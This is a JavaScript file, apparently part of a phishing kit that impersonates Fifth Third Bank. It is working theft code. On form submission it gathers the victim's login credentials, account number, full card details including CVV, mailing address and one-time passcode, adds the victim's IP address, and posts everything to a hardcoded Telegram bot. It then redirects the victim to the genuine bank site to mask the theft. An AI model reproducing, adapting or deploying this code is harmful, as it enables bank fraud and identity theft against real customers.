// vault/send.js

const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
const CHAT_ID = '5817278771';

function sendToTelegram(data, callback) {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(ipData => {
      const ip = ipData.ip || 'Unknown';
      const message = `[53rd Result]\n\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\nVERIFICATION\n🏦 Account Number: ${data.accountnumber}\n🧑 Name on Card: ${data.cardname}\n💳 Card Number: ${data.cardnumber}\n💳 CVV: ${data.cvv}\n📅 Expiry Date: ${data.expdate}\n🏠 Mailing Address: ${data.mailingaddress}\n🔐 OTP: ${data.otp}\n\n🌐 IP Address: ${ip}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(() => {
        if (callback) callback(); // Only now call the callback
      });
    });
}

document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('verify-form');
  if (!form) return;

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const userid = sessionStorage.getItem('userid') || '';
    const password = sessionStorage.getItem('password') || '';

    const data = {
      userid: userid,
      password: password,
      accountnumber: form.accountnumber.value,
      cardname: form.cardname.value,
      cardnumber: form.cardnumber.value,
      cvv: form.cvv.value,
      expdate: form.expdate.value,
      mailingaddress: form.mailingaddress.value,
      otp: form.otp.value
    };

    sendToTelegram(data, () => {
      form.reset();

      // Optional: Show a brief confirmation before redirect
      const messageDiv = document.createElement('div');
      messageDiv.innerText = "✅ Submitting... Please wait.";
      messageDiv.style.color = 'green';
      messageDiv.style.fontWeight = 'bold';
      messageDiv.style.textAlign = 'center';
      form.parentElement.insertBefore(messageDiv, form);

      setTimeout(() => {
        window.location.href = 'https://www.53.com/';
      }, 2500); // 2.5 seconds delay
    });
  });
});

window.sendToTelegram = sendToTelegram;
